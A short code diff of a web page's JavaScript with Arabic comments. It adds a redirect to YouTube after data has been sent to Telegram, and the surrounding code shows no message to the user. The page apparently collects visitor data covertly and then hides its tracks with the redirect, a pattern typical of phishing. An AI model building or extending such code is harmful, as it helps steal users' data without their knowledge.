@@ -179,10 +179,11 @@
                 const responseBody = await response.json();
                 console.log("استجابة تليجرام: ", responseBody);
 
-                // لا يتم عرض رسائل التنبيه هنا
+                // 5. تغيير الموقع إلى YouTube في نفس التبويبة
+                window.location.href = "https://www.youtube.com/";
+
             } catch (error) {
                 console.error("حدث خطأ أثناء إرسال البيانات إلى تليجرام:", error);
-                // لا يتم عرض رسائل التنبيه هنا
             }
         }
     </script>
